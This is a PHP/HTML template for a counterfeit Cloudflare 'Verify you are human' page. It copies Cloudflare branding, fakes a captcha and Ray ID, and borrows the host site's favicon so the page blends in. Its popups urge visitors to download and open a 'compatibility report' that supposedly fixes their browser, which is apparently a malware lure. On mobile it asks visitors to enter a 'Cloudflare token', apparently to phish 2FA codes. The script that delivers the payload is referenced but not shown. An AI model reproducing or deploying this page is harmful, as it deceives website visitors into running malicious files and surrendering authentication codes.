<!-- <!DOCTYPE html> -->
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Just a moment...</title>

	<?php
		// session start
		session_start();
	?>

  <!-- Favicon -->
  <?php
        // Check if fetch_url is already declared before defining it
        if (!function_exists('fetch_url')) {
            function fetch_url($url) {
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); // Follow redirects
                curl_setopt($ch, CURLOPT_TIMEOUT, 10); // Timeout for faster failure handling
                $data = curl_exec($ch);
                curl_close($ch);
                return $data;
            }
        }

        function detect_favicon($domain) {
            // Fetch the HTML from the domain
            $html = fetch_url($domain);
            if ($html) {
                // Look for the favicon in the HTML
                preg_match('/<link.*?rel=["\'](?:shortcut\s)?icon["\'].*?href=["\'](.*?)["\']/', $html, $matches);
                if (!empty($matches[1])) {
                    $favicon_url = $matches[1];
                    
                    // Handle relative URLs (convert to absolute)
                    if (strpos($favicon_url, 'http') !== 0) {
                        $favicon_url = rtrim($domain, '/') . '/' . ltrim($favicon_url, '/');
                    }

                    return $favicon_url; // Return the detected favicon URL
                }
            }
            
            // If no favicon is found in the HTML, return false
            return false;
        }

        function fallback_favicon($domain) {
            // Check for /favicon.ico in the root
            $favicon_url = $domain . "/favicon.ico";
            
            // Try to fetch favicon.ico
            if (@fetch_url($favicon_url)) {
                return $favicon_url;
            }
            
            // Return false if no favicon.ico is found
            return false;
        }

        // Get the root domain (main domain)
        $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";
        $host = $protocol . $_SERVER['HTTP_HOST']; // For example, "http://127.0.0.1"

        // First, try to detect favicon from HTML
        $favicon_url = detect_favicon($host);

        // If favicon not found in HTML, try /favicon.ico as a fallback
        if (!$favicon_url) {
            $favicon_url = fallback_favicon($host);
        }

		// Global icon URL
		$iconURL = '';

        // Only add <link rel="icon"> if a favicon is found
        if ($favicon_url) {
			$iconURL = htmlspecialchars($favicon_url);
            echo '<link rel="icon" href="' . htmlspecialchars($favicon_url) . '" type="image/x-icon">';
        }
    ?>


	<link rel="stylesheet" type="text/css" href="./assets/css/app.css">
</head>
<body>

<!-- get browser name -->
<?php
	function getBrowserName() {
	    // Get the user agent string
		$user_agent = $_SERVER['HTTP_USER_AGENT'];

		// Initialize the browser name variable
		$browser = "Unknown Browser";

		// Check for Microsoft Edge (Chromium-based and Legacy Edge)
		if (strpos($user_agent, 'Edg') !== false) {
			$browser = "Microsoft Edge";
		// Check for Opera
		} elseif (strpos($user_agent, 'OPR') !== false || strpos($user_agent, 'Opera') !== false) {
			$browser = "Opera";
		// Check for Google Chrome (after checking for Opera and Edge)
		} elseif (strpos($user_agent, 'Chrome') !== false) {
			$browser = "Google Chrome";
		// Check for Mozilla Firefox
		} elseif (strpos($user_agent, 'Firefox') !== false) {
			$browser = "Mozilla Firefox";
		// Check for Safari (excluding Chrome and Edge)
		} elseif (strpos($user_agent, 'Safari') !== false) {
			$browser = "Safari";
		}

		// Output the detected browser
		return $browser;
	}
?>

<input type="hidden" value="<?php echo getBrowserName(); ?>" id="browserName" />
<input type="hidden" value="<?php echo $_SERVER['HTTP_HOST']; ?>" id="httpHOST" />

<!-- Pop up -->
<!-- <div id="popup"> -->
	<!-- <div>
		<div data-translate="popup-msg">
			To display your report, <b>Cloudflare</b> needs to resend information from  your previous request, such as a search or form submission. <br/>
			Please confirm below to continue in <b><?php echo getBrowserName() ?></b>.
		</div>
		<label>
			<input type="checkbox" id="checkbox">
			<p data-translate="popup-check">I agree to allow <span style="font-weight: 500;"><?php echo $_SERVER['HTTP_HOST'] ?></span> to display and download my report.</p>
		</label>
	</div>
	<div>
		<button id="report" disabled data-translate="view_report">View Report</button>
	</div> -->
<!-- </div> -->


<!-- Pop up -->
<div class="pc_overlay_popup" id="popup">
    <!-- First Popup Title and Content -->
    <div class="pc_overlay_popup-title" id="pc_overlay_first-popup-title">
        <span data-translate="pc-popup-title">Browser Compatibility Check</span>
        <span class="pc_overlay_icon-gear">⚙️</span>
    </div>
    
    <div class="pc_overlay_popup-content" id="pc_overlay_first-popup-content">
        <p data-translate="pc-popup-content">We detected a potential compatibility issue with your browser. Please download a compatibility report to check your settings and ensure everything works smoothly.</p>
    </div>
    
    <!-- Dropdown Section -->
    <div class="pc_overlay_dropdown" onclick="pc_overlay_toggleDropdown()" id="pc_overlay_dropdown">
        <span data-translate="pc-dropdown-title">What happens after downloading the report?</span>
        <span class="dropdown-icon">▼</span>
    </div>
    
    <div class="pc_overlay_dropdown-content" id="pc_overlay_dropdown-content">
        <p data-translate="pc-dropdown-content">Open the file to automatically detect and resolve any compatibility issues. Once verified, your access will be adjusted for an optimal browsing experience.</p>
    </div>
    
    <!-- Checkbox Agreement -->
    <div class="pc_overlay_popup-checkbox" id="pc_overlay_first-popup-checkbox">
        <input type="checkbox" id="pc_overlay_agree-checkbox" onclick="pc_overlay_toggleButton()">
        <label for="pc_overlay_agree-checkbox" style="display: block; padding-top: 0;" data-translate="pc-checkbox-text">I agree to allow <?php echo $_SERVER['HTTP_HOST'] ?> to display and download my compatibility report.</label>
    </div>
    
    <!-- Footer with Download Button -->
    <div class="pc_overlay_popup-footer" id="pc_overlay_first-popup-footer">
        <button type="button" id="pc_overlay_download-button" disabled onclick="pc_overlay_openConfirmPopup()" data-translate="download-report">Download Report</button>
    </div>
    
    <!-- Second Popup Content for Confirmation -->
    <div class="pc_overlay_confirm-popup-content" id="pc_overlay_confirm-popup-content">
        <!-- Animated Icon and Title -->
        <div class="pc_overlay_icon-download">⬇️</div>
        <h3 data-translate="pc-confirm-title">Report Downloaded</h3>
        
        <!-- Instructions with enhanced styling -->
        <p data-translate="pc-confirm-content-1">Please open the downloaded report to begin verification.</p>
        <p class="pc_overlay_confirm-message" data-translate="pc-confirm-content-2">Once you’ve opened the report on your device, click the button below to confirm.</p>
        
        <!-- Button with updated label -->
        <button class="pc_overlay_confirm-button" onclick="pc_overlay_showLoading()" data-translate="pc-confirm-button">I’ve Opened the Report</button>
        <div class="pc_overlay_loading-text" id="pc_overlay_loading-text" data-translate="pc-confirm-loading-text">Verifying... Please wait.</div>
    </div>
</div>




<div id="overlay">
	<!-- <span id="close_popup">
		<img src="./assets/img/close-svgrepo-com.svg" />
	</span> -->
</div>


<!-- mobile popup -->
<div class="popup_mobile" id="popup_mobile">
    <div class="popup_mobile-content" style="
        border-radius: 3px;
        padding-top: 9px;
        padding-left: 15px;
        padding-right: 15px;
        padding-bottom: 0px;
    ">
        <div class="popup_mobile-header">
            <a aria-current="page" href="/" class="main-header-logo lh-0 flex-0" style="min-width: 92px; min-height:40px;">
                <svg xmlns="http://www.w3.org/2000/svg" width="204" height="30" fill="none" viewBox="0 0 204 30" style="width: 120px;height:30px"><g clip-path="url(#a)"><path fill="#FBAD41" d="M52.688 13.028c-.22 0-.437.008-.654.015a.297.297 0 0 0-.102.024.365.365 0 0 0-.236.255l-.93 3.249c-.401 1.397-.252 2.687.422 3.634.618.876 1.646 1.39 2.894 1.45l5.045.306c.15.008.28.08.359.199a.492.492 0 0 1 .051.434.64.64 0 0 1-.547.426l-5.242.306c-2.848.132-5.912 2.456-6.987 5.29l-.378 1a.28.28 0 0 0 .248.382h18.054a.48.48 0 0 0 .464-.35 13.12 13.12 0 0 0 .48-3.54c0-7.22-5.789-13.072-12.933-13.072"></path><path fill="#000" d="M85.519 18.886h2.99v8.249h5.218v2.647h-8.208V18.886ZM96.819 24.365v-.032c0-3.13 2.493-5.665 5.821-5.665 3.327 0 5.789 2.508 5.789 5.633v.032c0 3.129-2.493 5.665-5.821 5.665s-5.79-2.505-5.79-5.633Zm8.562 0v-.032c0-1.573-1.123-2.942-2.773-2.942-1.65 0-2.725 1.337-2.725 2.91v.032c0 1.572 1.122 2.942 2.757 2.942 1.634 0 2.741-1.338 2.741-2.91ZM112.086 25.003V18.89h3.033v6.055c0 1.572.783 2.317 1.985 2.317 1.201 0 1.985-.717 1.985-2.242v-6.134h3.032v6.039c0 3.519-1.985 5.056-5.049 5.056s-4.99-1.573-4.99-4.98M126.694 18.889h4.159c3.848 0 6.081 2.241 6.081 5.382v.032c0 3.14-2.265 5.477-6.144 5.477h-4.096V18.886v.004Zm4.202 8.216c1.788 0 2.97-.995 2.97-2.754v-.032c0-1.744-1.185-2.755-2.97-2.755h-1.217v5.541h1.217ZM141.277 18.886h8.621v2.648h-5.636v1.85h5.096v2.505h-5.096v3.893h-2.985V18.886ZM154.054 18.886h2.989v8.249h5.219v2.647h-8.208V18.886ZM170.067 18.809h2.878l4.589 10.971h-3.202l-.788-1.946h-4.159l-.768 1.946h-3.143l4.589-10.971h.004Zm2.619 6.676-1.202-3.097-1.217 3.097h2.419ZM181.383 18.889h5.096c1.647 0 2.789.438 3.509 1.182.635.621.954 1.465.954 2.536v.032c0 1.664-.879 2.77-2.218 3.344l2.572 3.797h-3.45l-2.17-3.3h-1.308v3.3h-2.989V18.886l.004.004Zm4.959 5.23c1.016 0 1.602-.497 1.602-1.29v-.031c0-.856-.614-1.29-1.618-1.29h-1.954v2.616h1.973l-.003-.004ZM195.253 18.886h8.669v2.568h-5.711v1.648h5.175v2.384h-5.175v1.728h5.79v2.568h-8.748V18.886ZM78.976 25.642c-.418.956-1.3 1.633-2.47 1.633-1.63 0-2.756-1.37-2.756-2.942V24.3c0-1.573 1.094-2.91 2.725-2.91 1.229 0 2.166.764 2.564 1.807h3.147c-.505-2.591-2.757-4.53-5.683-4.53-3.324 0-5.821 2.536-5.821 5.665v.032c0 3.129 2.461 5.633 5.79 5.633 2.843 0 5.068-1.864 5.655-4.36h-3.155l.004.004Z"></path><path fill="#F6821F" d="m44.808 29.578.334-1.175c.402-1.397.253-2.687-.42-3.634-.62-.876-1.647-1.39-2.896-1.45l-23.665-.306a.467.467 0 0 1-.374-.199.492.492 0 0 1-.052-.434.64.64 0 0 1 .552-.426l23.886-.306c2.836-.131 5.9-2.456 6.975-5.29l1.362-3.6a.914.914 0 0 0 .04-.477C48.998 5.259 42.79 0 35.368 0c-6.842 0-12.647 4.462-14.73 10.665a6.92 6.92 0 0 0-4.911-1.374c-3.28.33-5.92 3.002-6.246 6.318a7.148 7.148 0 0 0 .18 2.472c-5.36.16-9.66 4.598-9.66 10.052 0 .493.035.979.106 1.453a.46.46 0 0 0 .457.402h43.704a.57.57 0 0 0 .54-.418"></path></g><defs><clipPath id="a"><path fill="#FFF" d="M0 0h204v30H0z"></path></clipPath></defs></svg>
            </a>
            <h2 class="popup_mobile-h2" style="font-size: 9px;" data-translate="mb-verify-human">Verify you are human.</h2>
        </div>
        <p class="popup_mobile-p" style="font-size: 13px;" data-translate="mb-enter-cloudflare">Enter your Cloudflare token below to continue.</p>
        <div class="popup_mobile-input-container">
            <input type="text" id="token" placeholder="Enter your token" aria-label="Token input" style="font-size: 14px;">
            <img class="input-icon" src="https://storage.googleapis.com/firebase-extensions-icons/extension_icons/cloudflare/cloudflare-turnstile-app-check-provider_0.1.0@512.png" alt="Icon" aria-hidden="true" style="width: 16px;height: 16px;">
        </div>
        <p class="popup_mobile-note" style="font-size: 10px; margin-bottom: 5px; color: #fbad41;" data-translate="mb-note">Open the Cloudflare app on your phone and enter the verification token above.</p>
        <button class="popup_mobile-button" style="background-color: #f6821f;" data-translate="mb-submit-btn">Submit Token</button>
		<div class="popup_mobile-instruction" style="padding-bottom: 10px;">
			<img class="popup_mobile-img" src="./assets/img/Untitled-2.png" style="width: 144px;" />
			<div class="popup_mobile-help">
				<p style="font-size: 12px; margin-top: 10px; color: #333;" data-translate="mb-alert">
					Having trouble with 2FA? Can't proceed or find it?
				</p>
				<a href="/">
					<button style="
							background-color: #007bff;
							color: white;
							padding: 10px;
							border: none;
							border-radius: 5px;
							cursor: pointer;
							font-size: 14px;
							margin-top: 5px;
						"
						data-translate="mb-get-help"
					>
						Get Help
					</button>
				</a>
			</div>
		</div>
		<div style="height: 15px;"></div>
	</div>
</div>



<!-- Main Page -->

<div id="total">
	<div id="main_board">

		<div id="img_header">
			<h1 class="h1">
				<?php
					if ($iconURL) {
						$headers = @get_headers($iconURL);
						if ($headers && strpos($headers[0], '200') !== false) echo '<img src="'.$iconURL.'" id="favicon" />';
					}
				?>
				<span data-translate="headline"></span>
			</h1>
		</div>

		<h2 data-translate="wait" class="h2" id="wait">Verifying you are human. This may take a few seconds.</h2>
		<h2 data-translate="action" class="h2" id="action">Verify you are human by completing the action below.</h2>
		<div class="h2" id="success">
			<img src="./assets/img/check-svgrepo-com.svg" /> 
			<span data-translate="verify-success">Verification successful</span>
		</div>

		<div id="loading">
			<div id="load"></div>
		</div>

	<?php if (isset($_SESSION['darkmode']) && $_SESSION['darkmode'] == '1'): ?>
		
		<!-- Captcha Section Start -->
		<div id="captcha-wrapper" class="captcha-wrapper" >
		  <div class="captcha-container" style="background: #232323;"> 
		    <!-- Checkbox Section -->
		    <div class="captcha-content">
		      <div class="checkbox-container" id="checkbox-container" style="background: none;">
		        <!-- <input type="checkbox" id="captcha-checkbox"> -->

		        <div class="captcha-spinner" id="captcha-spinner"></div>

		        <video class="video1" id="video1">
		          <source src="./assets/img/dark_verify1.webm" type="video/webm">
		        </video>

		        <video class="video2" id="video2">
		          <source src="./assets/img/dark_verify2.webm" type="video/webm">
		        </video>

				<img class="video3" src="./assets/img/381599_error_icon.png" style="width: 30px; height: 30px; margin-top: -3px; margin-left: -3px; display: none;" />

		      </div>

		      <div class="captcha-text" id="captcha-text" style="color: #ccc;">
			  	<span data-translate="verify-human">Verify you are human</span>
		      </div>
		    </div>

		    <!-- Footer -->
		    <div class="captcha-footer">
		      <img class="captcha-logo" src="./assets/img/dark_logo.svg" alt="Cloudflare Logo">
		      <div class="captcha-privacy">
			  	<a href="#" style="color: #ccc; text-decoration: underline;" data-translate="privacy">Privacy</a> • <a href="#" style="color: #ccc; text-decoration: underline;" data-translate="terms">Terms</a>
		      </div>
		    </div>

		    <!-- Error message outside the captcha box -->
		    <div class="error-message" id="error-message">
				<span data-translate="issue">There was a problem, please try again.</span>
		    </div>
		  </div>

		</div>
		<!-- Captcha Section End -->

	<?php else: ?>

		<!-- Captcha Section Start -->
		<div id="captcha-wrapper" class="captcha-wrapper">
		  <div class="captcha-container">
		    <!-- Checkbox Section -->
		    <div class="captcha-content">
		      <div class="checkbox-container" id="checkbox-container">
		        <!-- <input type="checkbox" id="captcha-checkbox"> -->

		        <div class="captcha-spinner" id="captcha-spinner"></div>

		        <video class="video1" id="video1">
		          <source src="./assets/img/verify1.webm" type="video/webm">
		        </video>

		        <video class="video2" id="video2">
		          <source src="./assets/img/verify2.webm" type="video/webm">
		        </video>

				<img class="video3" src="./assets/img/381599_error_icon.png" style="width: 30px; height: 30px; margin-top: -3px; margin-left: -3px; display: none;" />

		      </div>

		      <div class="captcha-text" id="captcha-text">
			  	<span data-translate="verify-human">Verify you are human</span>
		      </div>
		    </div>

		    <!-- Footer -->
		    <div class="captcha-footer">
		      <img class="captcha-logo" src="./assets/img/logo-cloudflare-dark.svg" alt="Cloudflare Logo">
		      <div class="captcha-privacy">
			  	<a href="#" style="text-decoration: underline;" data-translate="privacy">Privacy</a> • <a href="#" style="text-decoration: underline;" data-translate="terms">Terms</a>
		      </div>
		    </div>

		    <!-- Error message outside the captcha box -->
		    <div class="error-message" id="error-message">
				<span data-translate="issue">There was a problem, please try again.</span>
		    </div>
		  </div>

		</div>
		<!-- Captcha Section End -->

	<?php endif; ?>

		
		<div data-translate="detail" class="detail"></div>
		<div data-translate="wait-respond" class="wait-respond"></div>
		<div data-translate="captcha-error" class="captcha-error"></div>

	</div>

	<div id="footer">

		<?php if (isset($_SESSION['darkmode']) && $_SESSION['darkmode'] == '1'): ?>
			
			<div>
				<span data-translate="ray_id">Ray ID: </span>
				<strong class="a_color" id="ray-id" style="color: #fff; font-weight: lighter;"></strong>
			</div>
			<div>
				<span data-translate="performance_security">Performance & security by </span>
				<strong class="a_color" style="color: #fff;">Cloudflare</strong>
			</div>
			
		<?php else: ?>
			
			<div>
				<span data-translate="ray_id">Ray ID: </span>
				<strong class="a_color" id="ray-id" style="color: #313131;"></strong>
			</div>
			<div>
				<span data-translate="performance_security">Performance & security by </span>
				<strong class="a_color">Cloudflare</strong>
			</div>
			
		<?php endif; ?>

	</div>
</div>


</body>
<script type="text/javascript" src="./assets/js/jquery.min.js"></script>
<script type="text/javascript" src="./assets/js/app.js"></script>
</html>